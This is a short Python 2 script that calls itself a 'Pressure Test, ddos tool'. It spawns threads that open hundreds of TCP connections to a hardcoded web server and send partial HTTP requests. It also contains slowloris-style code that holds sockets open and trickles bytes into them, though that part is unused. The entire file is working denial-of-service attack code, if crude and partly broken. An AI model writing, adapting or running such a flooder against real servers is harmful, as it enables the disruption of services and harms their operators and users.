#!/usr/bin/env python
import socket
import time
import threading
import thread
from scapy.all import *
#Pressure Test,ddos tool
#---------------------------
MAX_CONN=100
PORT=80
HOST="10.83.0.51"
PAGE="/index.html"
MAX=10
#---------------------------

buf=("GET %s HTTP/1.1\r\n"
    "Host: %s\r\n"
    "Content-Length: 10000000\r\n"
    "Cookie: just a test\r\n"
    "\r\n" % (PAGE,HOST))

buf2=("GET /search.php?q=%C7%EB%CA%E4%C8%EB%C4%FA%D2%AA%CB%D1%CB%F7%B5%C4%C4%DA%C8%DD HTTP/1.1\r\n")
#socks=[]
#create 20 session

class myThread(threading.Thread):
    def __init__(self, func, args, name=''):
        threading.Thread.__init__(self)
        self.func = func
        self.args = args
        self.name = name
#        print self.func
#        print self.args
#        print self.name
    
    def run(self):
        apply(self.func, self.args)
    
def conn_thread():  
#	global socks
	for i in range(0,MAX_CONN):
	        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		try:
			s.connect((HOST,PORT))
			s.send(buf2)
			print "Send buf OK!,conn=%d\n"%i
#			data=s.recv(1024)
#			print len(data)
#			if len(data) > 0:
#			    print data
#			socks.append(s)
		except Exception,ex:
			print "Could not connect to server or send error:%s"%ex
#		time.sleep(1)
#end def

#every session fill the data with string "fa"
def send_thread():  
	global socks
	print len(socks)
	j=0
	while True:
		for s in socks:
			try:
				s.send("fa")
				print "send socks OK\n!"
				print "s=%s\n"%s
			#	print s.recv(1024)
			#	s.close()
			except Exception,ex:
				print "Send Exception:%s\n"%ex
				socks.remove(s)
				s.close()
		j=j+1
		print j
			#time.sleep(1)
#end def
def main():
#    conn_th=threading.Thread(target=conn_thread,args=())
#    send_th=threading.Thread(target=send_thread,args=())
#    thread.start_new_thread(conn_thread,())
#    thread.start_new_thread(send_thread,())
    threads = []
    for i in range(0,MAX):
        t = myThread(conn_thread, (),())
        threads.append(t)
    print "already"
    for i in range(0,MAX):
        threads[i].start()
#        threads[i].join()
    print "already start"
    for i in range(0,MAX):
        threads[i].join()# join means wait until the child thread run over ,then the main thread start continue run
    print 'all done'
#    conn_thread()
#    send_thread()
    print "lyue"
main()

